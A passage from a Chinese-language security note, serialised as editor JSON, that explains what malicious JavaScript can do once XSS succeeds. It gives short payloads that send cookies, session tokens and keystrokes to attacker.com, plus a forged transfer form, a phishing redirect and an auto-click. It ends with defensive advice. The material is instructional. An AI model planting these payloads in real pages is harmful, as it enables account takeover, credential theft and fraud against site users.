","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击代码示例："}]},{"ID":"20241016092247-ks36lnw","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092247-ks36lnw","updated":"20241016092247"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  var img = new Image();\n  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092248-c8vvm00","Type":"NodeList","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092248-c8vvm00","updated":"20241016092248"},"Children":[{"ID":"20241016092249-7hwjq8l","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092249-7hwjq8l","updated":"20241016092249"},"Children":[{"ID":"20241016092250-9otr33y","Type":"NodeParagraph","Properties":{"id":"20241016092250-9otr33y","updated":"20241016092250"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击过程"},{"Type":"NodeText","Data":"：这段代码会创建一个新的图片请求，其中包含用户的 Cookie 信息。图片的 URL 指向攻击者的服务器（"},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"attacker.com"},{"Type":"NodeText","Data":"），攻击者通过这个请求获取用户的 Cookie。"}]}]},{"ID":"20241016092251-m47katl","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092251-m47katl","updated":"20241016092251"},"Children":[{"ID":"20241016092252-jax7hvx","Type":"NodeParagraph","Properties":{"id":"20241016092252-jax7hvx","updated":"20241016092252"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"危害"},{"Type":"NodeText","Data":"：攻击者可以使用窃取的 Cookie 模拟用户的身份，登录用户的账户，执行未授权操作，如购买商品、转移资金等。"}]}]}]},{"ID":"20241016092253-agxj900","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092253-agxj900","updated":"20241016092253"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"2. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"会话劫持"}]},{"ID":"20241016092254-s9blkb4","Type":"NodeParagraph","Properties":{"id":"20241016092254-s9blkb4","updated":"20241016092254"},"Children":[{"Type":"NodeText","Data":"通过窃取会话信息，攻击者可以劫持用户的会话，冒充用户进行各种操作。例如，攻击者获取用户的身份认证 Cookie 后，可以在其他浏览器中使用该 Cookie 模拟用户，进行登录。"}]},{"ID":"20241016092255-urq80m0","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241016092255-urq80m0","updated":"20241016092255"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击代码示例："}]},{"ID":"20241016092256-cg43rwl","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092256-cg43rwl","updated":"20241016092256"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  var sessionToken = document.cookie.match(/session=([^;]+)/)[1];\n  fetch('http://attacker.com/hijack-session', {\n    method: 'POST',\n    body: JSON.stringify({token: sessionToken})\n  });\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092257-agd150w","Type":"NodeList","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092257-agd150w","updated":"20241016092257"},"Children":[{"ID":"20241016092258-acdiddx","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092258-acdiddx","updated":"20241016092258"},"Children":[{"ID":"20241016092259-c0yk1u9","Type":"NodeParagraph","Properties":{"id":"20241016092259-c0yk1u9","updated":"20241016092259"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击过程"},{"Type":"NodeText","Data":"：攻击者通过提取浏览器中保存的会话令牌，发送给自己用于进一步攻击。"}]}]},{"ID":"20241016092260-zeonoyr","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092260-zeonoyr","updated":"20241016092260"},"Children":[{"ID":"20241016092261-qdleeig","Type":"NodeParagraph","Properties":{"id":"20241016092261-qdleeig","updated":"20241016092261"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"危害"},{"Type":"NodeText","Data":"：攻击者可以借此控制用户的账户和在线身份。"}]}]}]},{"ID":"20241016092262-8rsrzs2","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092262-8rsrzs2","updated":"20241016092262"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"3. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"伪造表单提交（CSRF 结合 XSS）"}]},{"ID":"20241016092263-ocuxdwr","Type":"NodeParagraph","Properties":{"id":"20241016092263-ocuxdwr","updated":"20241016092263"},"Children":[{"Type":"NodeText","Data":"攻击者可以通过 XSS 在用户不知情的情况下伪造表单提交，执行恶意操作。例如，将用户账户中的资金转移到攻击者的账户。"}]},{"ID":"20241016092264-grlsfbq","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241016092264-grlsfbq","updated":"20241016092264"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击代码示例："}]},{"ID":"20241016092265-prx4ctw","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092265-prx4ctw","updated":"20241016092265"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  var form = document.createElement('form');\n  form.action = 'http://example.com/transfer';\n  form.method = 'POST';\n\n  var input = document.createElement('input');\n  input.type = 'hidden';\n  input.name = 'amount';\n  input.value = '1000'; // 伪造金额\n\n  form.appendChild(input);\n  document.body.appendChild(form);\n  form.submit(); // 自动提交表单\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092266-dsl5p91","Type":"NodeList","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092266-dsl5p91","updated":"20241016092266"},"Children":[{"ID":"20241016092267-mtam3o1","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092267-mtam3o1","updated":"20241016092267"},"Children":[{"ID":"20241016092268-lh7ysb5","Type":"NodeParagraph","Properties":{"id":"20241016092268-lh7ysb5","updated":"20241016092268"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击过程"},{"Type":"NodeText","Data":"：这段代码自动创建并提交一个表单，向合法网站发起请求。由于用户已登录网站，网站会认为这是用户的正常操作。"}]}]},{"ID":"20241016092269-ltxqnhg","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092269-ltxqnhg","updated":"20241016092269"},"Children":[{"ID":"20241016092270-es2oca6","Type":"NodeParagraph","Properties":{"id":"20241016092270-es2oca6","updated":"20241016092270"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"危害"},{"Type":"NodeText","Data":"：攻击者可以利用 XSS 结合跨站请求伪造（CSRF）执行未经授权的操作，例如转账、修改账户设置等。"}]}]}]},{"ID":"20241016092271-0zf28xd","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092271-0zf28xd","updated":"20241016092271"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"4. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"键盘记录"}]},{"ID":"20241016092272-rxlnp9u","Type":"NodeParagraph","Properties":{"id":"20241016092272-rxlnp9u","updated":"20241016092272"},"Children":[{"Type":"NodeText","Data":"攻击者可以利用 JavaScript 编写键盘记录器，监控用户在网页上的输入行为，记录敏感信息如密码、银行卡号等。"}]},{"ID":"20241016092273-7at6j0e","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241016092273-7at6j0e","updated":"20241016092273"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击代码示例："}]},{"ID":"20241016092274-itvvilm","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092274-itvvilm","updated":"20241016092274"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  document.addEventListener('keypress', function(e) {\n    fetch('http://attacker.com/log?key=' + e.key);\n  });\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092275-kbuf4dc","Type":"NodeList","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092275-kbuf4dc","updated":"20241016092275"},"Children":[{"ID":"20241016092276-1q4q4nf","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092276-1q4q4nf","updated":"20241016092276"},"Children":[{"ID":"20241016092277-2d7a7lp","Type":"NodeParagraph","Properties":{"id":"20241016092277-2d7a7lp","updated":"20241016092277"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击过程"},{"Type":"NodeText","Data":"：这段代码监听网页中的键盘按键事件，并将按键内容发送到攻击者的服务器。"}]}]},{"ID":"20241016092278-m9www8f","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092278-m9www8f","updated":"20241016092278"},"Children":[{"ID":"20241016092279-eomkq7q","Type":"NodeParagraph","Properties":{"id":"20241016092279-eomkq7q","updated":"20241016092279"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"危害"},{"Type":"NodeText","Data":"：攻击者可以窃取用户输入的敏感信息，如密码、信用卡信息等。"}]}]}]},{"ID":"20241016092280-z67nhnc","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092280-z67nhnc","updated":"20241016092280"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"5. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"重定向到恶意网站"}]},{"ID":"20241016092281-c8q4xdc","Type":"NodeParagraph","Properties":{"id":"20241016092281-c8q4xdc","updated":"20241016092281"},"Children":[{"Type":"NodeText","Data":"攻击者可以通过 XSS 将用户重定向到另一个伪造的或恶意的网站。例如，用户访问某个合法网站后，立即被重定向到攻击者的钓鱼页面，从而被进一步攻击。"}]},{"ID":"20241016092282-jmc85kv","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241016092282-jmc85kv","updated":"20241016092282"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击代码示例："}]},{"ID":"20241016092283-lv8w029","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092283-lv8w029","updated":"20241016092283"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  window.location.href = 'http://attacker.com/phishing-page';\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092284-ps771fk","Type":"NodeList","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092284-ps771fk","updated":"20241016092284"},"Children":[{"ID":"20241016092285-7owqeme","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092285-7owqeme","updated":"20241016092285"},"Children":[{"ID":"20241016092286-23f611y","Type":"NodeParagraph","Properties":{"id":"20241016092286-23f611y","updated":"20241016092286"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击过程"},{"Type":"NodeText","Data":"：这段代码会将用户自动重定向到攻击者控制的恶意页面。"}]}]},{"ID":"20241016092287-pnmiinn","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092287-pnmiinn","updated":"20241016092287"},"Children":[{"ID":"20241016092288-o24097k","Type":"NodeParagraph","Properties":{"id":"20241016092288-o24097k","updated":"20241016092288"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"危害"},{"Type":"NodeText","Data":"：用户在恶意网站上可能会被进一步钓鱼、窃取登录凭据，或者感染恶意软件。"}]}]}]},{"ID":"20241016092289-wroyb0f","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092289-wroyb0f","updated":"20241016092289"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"6. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"执行恶意操作（点击劫持）"}]},{"ID":"20241016092290-at549lt","Type":"NodeParagraph","Properties":{"id":"20241016092290-at549lt","updated":"20241016092290"},"Children":[{"Type":"NodeText","Data":"攻击者可以利用 XSS 编写代码，模拟用户在网页上点击按钮或执行其他操作。例如，自动点赞某个帖子、关注某个用户等。"}]},{"ID":"20241016092291-ou7nyqr","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241016092291-ou7nyqr","updated":"20241016092291"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击代码示例："}]},{"ID":"20241016092292-c4cnnui","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092292-c4cnnui","updated":"20241016092292"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  document.getElementById('like-button').click(); // 自动点击\"点赞\"按钮\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092293-xu8m0l3","Type":"NodeList","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092293-xu8m0l3","updated":"20241016092293"},"Children":[{"ID":"20241016092294-g0aoy90","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092294-g0aoy90","updated":"20241016092294"},"Children":[{"ID":"20241016092295-tbu3dwg","Type":"NodeParagraph","Properties":{"id":"20241016092295-tbu3dwg","updated":"20241016092295"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击过程"},{"Type":"NodeText","Data":"：攻击者自动触发某些网页元素的点击事件，导致用户不知情的情况下执行操作。"}]}]},{"ID":"20241016092296-pup7j0m","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092296-pup7j0m","updated":"20241016092296"},"Children":[{"ID":"20241016092297-ngi2kax","Type":"NodeParagraph","Properties":{"id":"20241016092297-ngi2kax","updated":"20241016092297"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"危害"},{"Type":"NodeText","Data":"：攻击者可以在社交网络上自动点赞、分享恶意内容，甚至扩散攻击范围。"}]}]}]},{"ID":"20241016092298-bh1cd6w","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092298-bh1cd6w","updated":"20241016092298"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"总结："}]},{"ID":"20241016092299-jqepmpx","Type":"NodeParagraph","Properties":{"id":"20241016092299-jqepmpx","updated":"20241016092299"},"Children":[{"Type":"NodeText","Data":"XSS 攻击中的 JavaScript 代码可以执行许多恶意操作，包括窃取敏感信息、劫持用户会话、伪造请求、窃取用户输入等。为了防止这些攻击，开发者必须对用户输入进行严格的验证和转义，同时结合其他安全措施（如 CSP、同源策略、CSRF 令牌）来增强防护。"}]}]}]},{"ID":"20241016093638-4455vad","Type":"NodeParagraph","Properties":{"id":"20241016093638-4455vad","updated":"20241016093638"}}]}